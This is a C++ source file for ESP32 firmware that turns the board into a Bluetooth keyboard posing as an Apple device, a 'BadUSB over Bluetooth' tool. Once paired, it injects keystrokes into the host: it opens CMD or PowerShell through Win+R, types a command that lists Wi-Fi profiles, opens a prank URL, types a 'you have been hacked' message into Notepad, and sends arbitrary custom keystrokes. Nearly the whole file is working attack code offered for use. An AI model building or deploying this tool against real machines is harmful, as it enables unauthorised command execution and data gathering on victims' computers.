/**
 * bad_ble.cpp — BadUSB over Bluetooth (BLE HID Keyboard Injection)
 * ------------------------------------------------------------------
 * Implements a Bluetooth Low Energy HID keyboard device using NimBLE.
 * When paired with a Windows/Linux/Mac host, the ESP32 appears as a
 * legitimate Bluetooth keyboard and can inject arbitrary keystrokes.
 *
 * Payloads (run on target after pairing):
 *   - Open CMD          : Win+R → "cmd" → Enter
 *   - Open PowerShell   : Win+R → "powershell" → Enter
 *   - Notepad message   : Opens notepad, types custom text
 *   - Rick Roll         : Opens browser to YouTube URL
 *   - Download & Execute: PowerShell one-liner (PoC only)
 *   - Custom payload    : User-defined keystrokes via web UI
 *
 * Uses FreeRTOS task for non-blocking payload execution.
 * Demonstrates keystroke injection attacks (T1204.001 in MITRE ATT&CK).
 *
 * Author: ESP32 Cyber Device Project
 */
#include "bad_ble.h"

static const uint8_t _hidReportDescriptor[] = {
  0x05,0x01, 0x09,0x06, 0xA1,0x01,
  0x85,0x01,
  0x05,0x07, 0x19,0xE0, 0x29,0xE7,
  0x15,0x00, 0x25,0x01, 0x75,0x01, 0x95,0x08, 0x81,0x02,
  0x95,0x01, 0x75,0x08, 0x81,0x03,
  0x95,0x06, 0x75,0x08, 0x15,0x00, 0x25,0x65,
  0x05,0x07, 0x19,0x00, 0x29,0x65, 0x81,0x00,
  0xC0
};

void BadBLE::onConnect(NimBLEServer* s, NimBLEConnInfo& info) {
  _connected=true; _connectedAt=millis(); _connCount++;
  Serial.printf("BadBLE: connected, requested long conn interval\n");
  // Don't update status yet - Windows does several probe connects before the real one
}

void BadBLE::onDisconnect(NimBLEServer* s, NimBLEConnInfo& info, int reason) {
  _connected=false; _taskRunning=false;
  Serial.printf("BadBLE: disconnected reason=0x%X count=%d\n", reason, _connCount);
  _status=_running?"Waiting to pair (Windows probing)...":"Idle";
  if(_running) NimBLEDevice::getAdvertising()->start();
  Serial.println("BadBLE: restarted advertising");
}

void BadBLE::begin() {
  _running=false; _connected=false; _busy=false; _taskRunning=false;
  _ready=false; _hasPending=false; _connCount=0; _status="Idle";

  _server=NimBLEDevice::createServer();
  if(!_server){ Serial.println("BadBLE: server failed"); return; }
  _server->setCallbacks(this);

  // Enable bonding - required for Windows to trust the HID device
  NimBLEDevice::setSecurityAuth(BLE_SM_PAIR_AUTHREQ_BOND);
  NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

  _hid   = new NimBLEHIDDevice(_server);
  _input = _hid->getInputReport(1);
  _hid->setManufacturer("Apple");
  _hid->setPnp(0x02, 0x004C, 0x0267, 0x0450);
  _hid->setHidInfo(0x00, 0x01);
  _hid->setReportMap((uint8_t*)_hidReportDescriptor, sizeof(_hidReportDescriptor));
  _hid->setBatteryLevel(100);
  _hid->startServices();
  _ready=true;
  Serial.println("BadBLE: HID server ready");
}

bool BadBLE::startAdvertising(const String& name) {
  if(!_ready) return false;
  NimBLEDevice::setDeviceName(name.c_str());
  NimBLEAdvertising* adv=NimBLEDevice::getAdvertising();
  adv->stop();
  adv->setAppearance(0x03C1);
  adv->addServiceUUID(_hid->getHidService()->getUUID());
  adv->start();
  _running=true; _connCount=0;
  _status="Step 1: Open Windows Bluetooth settings and pair this device";
  return true;
}

void BadBLE::stop() {
  _running=false; _busy=false; _hasPending=false; _connected=false; _taskRunning=false;
  if(_ready) NimBLEDevice::getAdvertising()->stop();
  _status="Idle";
}

void BadBLE::runPayload(BadBLEPayload type, const String& custom) {
  _pendingType=type; _pendingPayload=custom; _hasPending=true;
  if(!_connected){
    _status="Queued - waiting for device to connect...";
  } else {
    _status="Queued - launching...";
  }
  Serial.printf("BadBLE: payload %d queued\n",(int)type);
}

void BadBLE::_pressKey(uint8_t mod, uint8_t key) {
  if(!_input) return;
  uint8_t r[8]={mod,0,key,0,0,0,0,0};
  _input->setValue(r,8); _input->notify();
  vTaskDelay(pdMS_TO_TICKS(15));
}
void BadBLE::_releaseKeys() {
  if(!_input) return;
  uint8_t r[8]={0};
  _input->setValue(r,8); _input->notify();
  vTaskDelay(pdMS_TO_TICKS(15));
}
uint8_t BadBLE::_charToKeycode(char c, uint8_t& mod) {
  mod=0;
  if(c>='a'&&c<='z') return 4+(c-'a');
  if(c>='A'&&c<='Z'){ mod=KEY_MOD_LSHIFT; return 4+(c-'A'); }
  if(c>='1'&&c<='9') return 30+(c-'1');
  if(c=='0') return 39;
  switch(c){
    case ' ': return 0x2C; case '\n': case '\r': return 0x28;
    case '.': return 0x37; case '/': return 0x38;
    case ':': mod=KEY_MOD_LSHIFT; return 0x33;
    case '-': return 0x2D; case '_': mod=KEY_MOD_LSHIFT; return 0x2D;
    case '!': mod=KEY_MOD_LSHIFT; return 0x1E;
    case '@': mod=KEY_MOD_LSHIFT; return 0x1F;
    case '\\': return 0x31;
  }
  return 0;
}
void BadBLE::_typeString(const String& s) {
  for(int i=0;i<(int)s.length();i++){
    uint8_t mod=0, kc=_charToKeycode(s[i],mod);
    if(kc){ _pressKey(mod,kc); _releaseKeys(); vTaskDelay(pdMS_TO_TICKS(40)); }
  }
}
void BadBLE::_openRun() {
  _pressKey(KEY_MOD_LGUI, 0x15); _releaseKeys(); // Win+R (r = 0x15)
  vTaskDelay(pdMS_TO_TICKS(1500));
}

void BadBLE::_payloadTask(void* param) {
  BadBLE* self=(BadBLE*)param;
  self->_taskRunning=true; self->_busy=true;
  vTaskDelay(pdMS_TO_TICKS(300)); // short settle

  Serial.printf("BadBLE: EXECUTING payload %d\n",(int)self->_pendingType);

  switch(self->_pendingType){
    case BADBLE_OPEN_CMD:
      self->_status="Opening CMD...";
      self->_openRun();
      self->_typeString("cmd");
      self->_pressKey(0,0x28); self->_releaseKeys();
      break;
    case BADBLE_DUMP_WIFI:
      self->_status="Dumping WiFi...";
      self->_openRun();
      self->_typeString("cmd");
      self->_pressKey(0,0x28); self->_releaseKeys();
      vTaskDelay(pdMS_TO_TICKS(1500));
      self->_typeString("netsh wlan show profiles");
      self->_pressKey(0,0x28); self->_releaseKeys();
      break;
    case BADBLE_RICKROLL:
      self->_status="Rick rolling...";
      self->_openRun();
      self->_typeString("https://youtu.be/dQw4w9WgXcQ");
      self->_pressKey(0,0x28); self->_releaseKeys();
      break;
    case BADBLE_NOTEPAD_MSG:
      self->_status="Opening notepad...";
      self->_openRun();
      self->_typeString("notepad");
      self->_pressKey(0,0x28); self->_releaseKeys();
      vTaskDelay(pdMS_TO_TICKS(2000));
      self->_typeString("You have been hacked by ESP32 Cyber");
      break;
    case BADBLE_POWERSHELL:
      self->_status="Opening PowerShell...";
      self->_openRun();
      self->_typeString("powershell");
      self->_pressKey(0,0x28); self->_releaseKeys();
      break;
    case BADBLE_CUSTOM:
      self->_status="Typing custom...";
      self->_typeString(self->_pendingPayload);
      break;
  }

  self->_hasPending=false; self->_busy=false; self->_taskRunning=false;
  self->_status="Done!";
  Serial.println("BadBLE: payload complete");
  vTaskDelete(nullptr);
}

void BadBLE::tick() {
  if(!_running) return;

  // Update status guidance based on connection state
  if(!_connected && !_busy){
    if(_connCount == 0){
      _status="Step 1: Open Windows BT settings and click Pair on this device";
    } else if(_connCount < 5){
      _status="Windows installing driver... (" + String(_connCount) + " probes seen)";
    } else {
      _status="Pairing complete? Try Run Payload now, then reconnect";
    }
  }

  if(_connected && !_busy){
    uint32_t stableFor = millis()-_connectedAt;
    if(stableFor < 2000){
      _status="Connected - stabilising...";
    } else if(_hasPending){
      // Connected and stable - launch payload immediately
      if(!_taskRunning){
        xTaskCreate(_payloadTask, "badble", 4096, this, 1, nullptr);
      }
    } else {
      _status="Connected & ready - press Run Payload";
    }
  }
}
